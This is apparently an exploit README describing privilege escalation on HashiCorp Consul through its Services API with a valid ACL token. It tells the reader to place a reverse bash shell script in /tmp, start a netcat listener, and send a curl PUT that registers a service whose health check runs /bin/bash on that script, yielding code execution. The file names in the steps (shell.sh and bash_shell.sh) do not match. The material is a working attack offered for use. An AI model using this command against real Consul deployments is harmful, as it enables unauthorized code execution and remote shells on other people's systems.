# Hashicorp-Consul-Privilege-Escalation-via-Services-API_ACL-Token
Local or remote privilege escalation for Hashicorp Consul via Services API & ACL Token

Shell command that can be run locally to perform privilege escalation on a vulnerable Linux target if not accessible remotely for one reason or another (Firewall Rule, Only running locally). It could also be used remotely, but there's better exploits out there such as metasploit to do that... but it can be done.

# How-To: 

1.There is a shell.sh file included that contains a reverse bash shell that can be modified, or, replace the command all together with your own. Place or create your own shell.sh in (recomended) /tmp directory.

2. Set up a listener (Netcat) if using a reverse shell.

3. Run the following command:

curl --header "X-Consul-Token: #<REPLACE_WITH_YOUR_ACL_TOKEN_HERE>#" --request PUT -d '{"ID": "LPE", "Name": "LPE", "Address": "127.0.0.1", "Port": 80, "check": {"Args": ["/bin/bash", "/tmp/bash_shell.sh"], "interval": "30s", "timeout": "100000s"}}' http://127.0.0.1:8500/v1/agent/service/register

Prerequisites: Hashicorp Consul running, Knowledge of or way to obtain a valid ACL Token.

 
